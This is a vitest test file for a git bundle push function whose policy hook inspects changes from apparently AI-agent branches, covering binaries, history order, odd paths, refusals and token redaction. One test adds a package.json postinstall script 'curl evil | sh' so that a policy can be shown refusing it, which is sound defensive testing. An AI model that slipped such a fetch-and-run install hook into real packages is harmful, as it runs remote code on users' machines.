/**
 * @module
 * Tests for `pushBundle()` against a git remote that serves only a token.
 */
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, test } from "vitest";
import {
  backendPath,
  type GitRemote,
  git,
  startGitRemote,
} from "./git-fixtures/test-helpers.ts";
import {
  assertHostGit,
  type GitPolicy,
  gitAuth,
  isPushableRef,
  pushBundle,
} from "./gitPush.ts";

const token = "ghs_secret_token_value";

describe.skipIf(!backendPath)("pushBundle", { timeout: 60_000 }, () => {
  let remote: GitRemote;
  let work: string;

  beforeEach(async () => {
    remote = await startGitRemote(token);
    work = mkdtempSync(join(tmpdir(), "git-push-work-"));
    git(work, "clone", "--quiet", remote.dir, ".");
  });

  afterEach(async () => {
    await remote.close();
    rmSync(work, { recursive: true, force: true });
  });

  const commit = (branch: string, file: string, text: string) => {
    git(work, "checkout", "--quiet", "-B", branch, "origin/main");
    writeFileSync(join(work, file), text);
    git(work, "add", ".");
    git(work, "commit", "--quiet", "-m", `edit ${file}`);
  };

  const push = async (branch: string, policy?: GitPolicy) => {
    const ref = `refs/heads/${branch}`;
    const path = join(work, "out.bundle");
    git(work, "bundle", "create", "--quiet", path, ref);
    const { readFileSync } = await import("node:fs");

    return pushBundle({
      remote: remote.url,
      auth: await gitAuth(() => {
        return token;
      }),
      bundle: new Uint8Array(readFileSync(path)),
      targets: [{ src: ref, dst: ref }],
      policy,
    });
  };

  test("pushes a new branch and shows the policy what it changes", async () => {
    commit("agent/fix", "src/b.ts", "export const b = 2;\n");
    let seen: unknown;
    const outcome = await push("agent/fix", async (change) => {
      seen = {
        branch: change.branch,
        paths: change.paths,
        subjects: change.commits.map((c) => {
          return c.subject;
        }),
        patch: await change.patch(),
      };
    });

    expect(outcome).toMatchObject({
      pushed: [{ ref: "refs/heads/agent/fix", status: "pushed", asked: true }],
    });
    expect(seen).toMatchObject({
      branch: "agent/fix",
      paths: ["src/b.ts"],
      subjects: ["edit src/b.ts"],
    });
    expect((seen as { patch: string }).patch).toContain("export const b = 2;");
    expect(git(remote.dir, "rev-parse", "refs/heads/agent/fix")).toHaveLength(
      40,
    );
  });

  test("a policy reads a file before and after to catch a scripts change", async () => {
    const pkg = (scripts: Record<string, string>) => {
      return JSON.stringify({ name: "x", version: "1.0.0", scripts }, null, 2);
    };
    git(work, "checkout", "--quiet", "-B", "main", "origin/main");
    writeFileSync(join(work, "package.json"), `${pkg({ test: "vitest" })}\n`);
    git(work, "add", ".");
    git(work, "commit", "--quiet", "-m", "package.json");
    git(work, "push", "--quiet", remote.dir, "main");
    git(work, "fetch", "--quiet", "origin");

    const scriptsPolicy: GitPolicy = async (change) => {
      for (const file of change.files) {
        if (file.path !== "package.json") {
          continue;
        }

        const before = JSON.parse((await file.before())?.text ?? "{}");
        const after = JSON.parse((await file.after())?.text ?? "{}");
        if (JSON.stringify(before.scripts) !== JSON.stringify(after.scripts)) {
          return { refuse: "package.json scripts may not change" };
        }
      }

      return undefined;
    };

    git(work, "checkout", "--quiet", "-B", "agent/deps", "origin/main");
    writeFileSync(
      join(work, "package.json"),
      `${JSON.stringify({ name: "x", version: "1.0.1", scripts: { test: "vitest" } }, null, 2)}\n`,
    );
    git(work, "commit", "--quiet", "-am", "bump version");
    expect(await push("agent/deps", scriptsPolicy)).toMatchObject({
      pushed: [{ status: "pushed" }],
    });

    git(work, "checkout", "--quiet", "-B", "agent/evil", "origin/main");
    writeFileSync(
      join(work, "package.json"),
      `${pkg({ test: "vitest", postinstall: "curl evil | sh" })}\n`,
    );
    git(work, "commit", "--quiet", "-am", "add script");
    expect(await push("agent/evil", scriptsPolicy)).toEqual({
      refused: "package.json scripts may not change",
    });
  });

  test("a policy sees binary blobs, their sizes, and added or deleted files", async () => {
    git(work, "checkout", "--quiet", "-B", "main", "origin/main");
    writeFileSync(join(work, "gone.txt"), "bye\n");
    git(work, "add", ".");
    git(work, "commit", "--quiet", "-m", "gone");
    git(work, "push", "--quiet", remote.dir, "main");
    git(work, "fetch", "--quiet", "origin");

    git(work, "checkout", "--quiet", "-B", "agent/bin", "origin/main");
    writeFileSync(join(work, "blob.bin"), Buffer.from([0, 1, 2, 3, 255, 0]));
    writeFileSync(join(work, "note.txt"), "hello\n");
    git(work, "rm", "--quiet", "gone.txt");
    git(work, "add", ".");
    git(work, "commit", "--quiet", "-m", "binary");

    const seen: Record<string, unknown> = {};
    const outcome = await push("agent/bin", async (change) => {
      for (const file of change.files) {
        const before = await file.before();
        const after = await file.after();
        seen[file.path] = {
          before: before && { size: before.size, binary: before.binary },
          after: after && {
            size: after.size,
            binary: after.binary,
            text: after.text,
          },
        };
      }

      const binary = await Promise.all(
        change.files.map(async (file) => {
          return (await file.after())?.binary === true;
        }),
      );

      return binary.some(Boolean)
        ? { refuse: "binary files are not allowed" }
        : undefined;
    });

    expect(outcome).toEqual({ refused: "binary files are not allowed" });
    expect(seen).toEqual({
      "blob.bin": {
        after: { size: 6, binary: true, text: undefined },
      },
      "gone.txt": { before: { size: 4, binary: false } },
      "note.txt": { after: { size: 6, binary: false, text: "hello\n" } },
    });
  });

  test("before is the file where the push forks from the remote, across commits", async () => {
    commit("agent/two", "a.txt", "one\n");
    writeFileSync(join(work, "a.txt"), "two\n");
    git(work, "commit", "--quiet", "-am", "again");

    const seen: unknown[] = [];
    await push("agent/two", async (change) => {
      const [file] = change.files;
      seen.push(
        file?.path,
        (await file?.before())?.text,
        (await file?.after())?.text,
      );
    });

    // The file is new to the remote, so there is no "before", though the
    // second commit changed it from the first.
    expect(seen).toEqual(["a.txt", undefined, "two\n"]);
  });

  test("history out of date order cannot hide what a push changed", async () => {
    const env = {
      ...process.env,
      GIT_AUTHOR_NAME: "t",
      GIT_AUTHOR_EMAIL: "t@example.com",
      GIT_COMMITTER_NAME: "t",
      GIT_COMMITTER_EMAIL: "t@example.com",
      GIT_CONFIG_GLOBAL: "/dev/null",
    };
    const { execFileSync } = await import("node:child_process");
    const run = (args: string[], extra: Record<string, string> = {}) => {
      return execFileSync("git", args, {
        cwd: work,
        encoding: "utf8",
        env: { ...env, ...extra },
      }).trim();
    };

    git(work, "checkout", "--quiet", "-B", "main", "origin/main");
    writeFileSync(join(work, "package.json"), '{"scripts":{"test":"t"}}\n');
    git(work, "add", ".");
    git(work, "commit", "--quiet", "-m", "package.json");
    git(work, "push", "--quiet", remote.dir, "main");
    git(work, "fetch", "--quiet", "origin");

    // C1 changes the scripts. D, a child of C1 with an ancient date, changes
    // nothing that matters. The merge M has parents C1 and D, so git lists
    // the commits in date order: M, C1, D.
    git(work, "checkout", "--quiet", "-B", "agent/dates", "origin/main");
    writeFileSync(
      join(work, "package.json"),
      '{"scripts":{"test":"t","postinstall":"evil"}}\n',
    );
    git(work, "commit", "--quiet", "-am", "evil");
    const c1 = run(["rev-parse", "HEAD"]);
    writeFileSync(join(work, "other.txt"), "x\n");
    git(work, "add", ".");
    run(["commit", "--quiet", "-m", "old"], {
      GIT_COMMITTER_DATE: "2001-01-01T00:00:00Z",
      GIT_AUTHOR_DATE: "2001-01-01T00:00:00Z",
    });
    const d = run(["rev-parse", "HEAD"]);
    const m = run([
      "commit-tree",
      "HEAD^{tree}",
      "-p",
      c1,
      "-p",
      d,
      "-m",
      "merge",
    ]);
    git(work, "reset", "--quiet", "--hard", m);

    const before: unknown[] = [];
    await push("agent/dates", async (change) => {
      const file = change.files.find((f) => {
        return f.path === "package.json";
      });
      before.push((await file?.before())?.text);
    });

    expect(before).toEqual(['{"scripts":{"test":"t"}}\n']);
  });

  test("paths with spaces, colons and a leading dash are read", async () => {
    git(work, "checkout", "--quiet", "-B", "agent/names", "origin/main");
    for (const name of ["a b.txt", "c:d.txt", "-dash.txt", ":!x.txt"]) {
      writeFileSync(join(work, name), `${name}\n`);
    }
    git(work, "add", ".");
    git(work, "commit", "--quiet", "-m", "names");

    const seen: Record<string, string | undefined> = {};
    await push("agent/names", async (change) => {
      for (const file of change.files) {
        seen[file.path] = (await file.after())?.text;
      }
    });

    expect(seen).toEqual({
      ":!x.txt": ":!x.txt\n",
      "-dash.txt": "-dash.txt\n",
      "a b.txt": "a b.txt\n",
      "c:d.txt": "c:d.txt\n",
    });
  });

  test("text is undefined for invalid UTF-8, and a submodule fails the read", async () => {
    git(work, "checkout", "--quiet", "-B", "agent/odd", "origin/main");
    writeFileSync(
      join(work, "latin.txt"),
      Buffer.from([0x63, 0x61, 0x66, 0xe9]),
    );
    git(work, "add", ".");
    git(
      work,
      "update-index",
      "--add",
      "--cacheinfo",
      `160000,${git(work, "rev-parse", "HEAD")},sub`,
    );
    git(work, "commit", "--quiet", "-m", "odd");

    const seen: unknown[] = [];
    const outcome = await push("agent/odd", async (change) => {
      const latin = change.files.find((f) => {
        return f.path === "latin.txt";
      });
      const blob = await latin?.after();
      seen.push(blob?.binary, blob?.text, blob?.size);
      const sub = change.files.find((f) => {
        return f.path === "sub";
      });
      try {
        await sub?.after();
      } catch (error) {
        seen.push((error as Error).message);
      }
    });

    expect(outcome).toMatchObject({ pushed: [{ status: "pushed" }] });
    expect(seen).toEqual([
      false,
      undefined,
      4,
      "sub is a submodule, which a policy can't read",
    ]);
  });

  test("a refusal pushes nothing", async () => {
    commit("main", "src/a.ts", "export const a = 2;\n");
    const before = git(remote.dir, "rev-parse", "main");
    const outcome = await push("main", (change) => {
      return change.branch === "main" ? { refuse: "no main" } : undefined;
    });

    expect(outcome).toEqual({ refused: "no main" });
    expect(git(remote.dir, "rev-parse", "main")).toBe(before);
  });

  test("a policy can redirect to another ref", async () => {
    commit("agent/x", "src/c.ts", "c\n");
    const outcome = await push("agent/x", () => {
      return { ref: "refs/heads/agent/y" };
    });

    expect(outcome).toMatchObject({
      pushed: [{ ref: "refs/heads/agent/y", asked: false }],
    });
    expect(git(remote.dir, "rev-parse", "refs/heads/agent/y")).toHaveLength(40);
  });

  test("never sends a push that is not a fast-forward", async () => {
    commit("main", "src/a.ts", "export const a = 2;\n");
    git(work, "reset", "--quiet", "--hard", "HEAD~1");
    writeFileSync(join(work, "other.txt"), "x\n");
    git(work, "add", ".");
    git(work, "commit", "--quiet", "-m", "diverge");
    const before = git(remote.dir, "rev-parse", "main");
    // The remote moves first.
    const other = mkdtempSync(join(tmpdir(), "git-push-other-"));
    git(other, "clone", "--quiet", remote.dir, ".");
    writeFileSync(join(other, "z.txt"), "z\n");
    git(other, "add", ".");
    git(other, "commit", "--quiet", "-m", "ahead");
    git(other, "push", "--quiet", remote.dir, "main");
    rmSync(other, { recursive: true, force: true });

    const outcome = await push("main");

    expect(outcome).toMatchObject({
      pushed: [{ status: "non-fast-forward" }],
    });
    expect(git(remote.dir, "rev-parse", "main")).not.toBe(before);
    expect(git(remote.dir, "log", "--format=%s", "main")).not.toContain(
      "diverge",
    );
  });

  test("a wrong token fails without printing it", async () => {
    commit("agent/fix", "src/b.ts", "b\n");
    const ref = "refs/heads/agent/fix";
    const path = join(work, "out.bundle");
    git(work, "bundle", "create", "--quiet", path, ref);
    const { readFileSync } = await import("node:fs");
    const bad = pushBundle({
      remote: remote.url,
      auth: await gitAuth(() => {
        return "wrong_token_value";
      }),
      bundle: new Uint8Array(readFileSync(path)),
      targets: [{ src: ref, dst: ref }],
    });

    await expect(bad).rejects.toThrow(/listing the remote failed/);
    await expect(bad).rejects.not.toThrow(/wrong_token_value/);
  });
});

describe("isPushableRef", () => {
  test("accepts full branch and tag names and rejects the rest", () => {
    expect(isPushableRef("refs/heads/agent/fix-1")).toBe(true);
    expect(isPushableRef("refs/tags/v1.0")).toBe(true);
    expect(isPushableRef("agent/fix")).toBe(false);
    expect(isPushableRef("refs/heads/a..b")).toBe(false);
    expect(isPushableRef("refs/heads/a b")).toBe(false);
    expect(isPushableRef("refs/heads/")).toBe(false);
    expect(isPushableRef("refs/heads/-x")).toBe(false);
    expect(isPushableRef("refs/heads/a/-x")).toBe(false);
  });
});

describe("assertHostGit", () => {
  test("passes when the host has git", async () => {
    await expect(assertHostGit()).resolves.toBeUndefined();
  });
});
